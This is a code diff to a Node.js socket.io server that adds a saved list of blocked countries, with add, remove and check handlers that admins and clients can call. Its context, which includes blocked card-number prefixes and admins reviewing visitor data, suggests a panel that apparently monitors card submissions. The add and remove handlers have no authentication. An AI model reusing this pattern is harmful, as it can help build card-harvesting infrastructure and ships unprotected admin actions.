@@ -113,6 +113,7 @@ function saveData() {
       savedVisitors,
       whatsappNumber,
       globalBlockedCards,
+      globalBlockedCountries,
       lastSaved: new Date().toISOString(),
     };
     const jsonData = JSON.stringify(data, null, 2);
@@ -142,6 +143,7 @@ let visitorCounter = savedData.visitorCounter;
 let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
 let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
 let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
+let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
 
 // Generate unique API key
 function generateApiKey() {
@@ -776,6 +778,47 @@ io.on("connection", (socket) => {
     const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
     const isBlocked = globalBlockedCards.includes(prefix);
     socket.emit("blockedCards:checkResult", { isBlocked, prefix });
+  });
+
+  // Blocked Countries: Get list
+  socket.on("blockedCountries:get", () => {
+    socket.emit("blockedCountries:list", globalBlockedCountries);
+  });
+
+  // Blocked Countries: Add country
+  socket.on("blockedCountries:add", (country) => {
+    if (country && !globalBlockedCountries.includes(country)) {
+      globalBlockedCountries.push(country);
+      saveData();
+      // Notify all admins
+      admins.forEach((admin, adminSocketId) => {
+        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
+      });
+      // Broadcast to all clients
+      io.emit("blockedCountries:updated", globalBlockedCountries);
+      console.log(`Blocked country added: ${country}`);
+    }
+  });
+
+  // Blocked Countries: Remove country
+  socket.on("blockedCountries:remove", (country) => {
+    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
+    saveData();
+    // Notify all admins
+    admins.forEach((admin, adminSocketId) => {
+      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
+    });
+    // Broadcast to all clients
+    io.emit("blockedCountries:updated", globalBlockedCountries);
+    console.log(`Blocked country removed: ${country}`);
+  });
+
+  // Blocked Countries: Check if visitor's country is blocked
+  socket.on("blockedCountries:check", (country) => {
+    const isBlocked = globalBlockedCountries.some(c => 
+      c.toLowerCase() === country.toLowerCase()
+    );
+    socket.emit("blockedCountries:checkResult", { isBlocked, country });
   });
 
   // Admin: Mark visitor data as read (hide new data indicator)
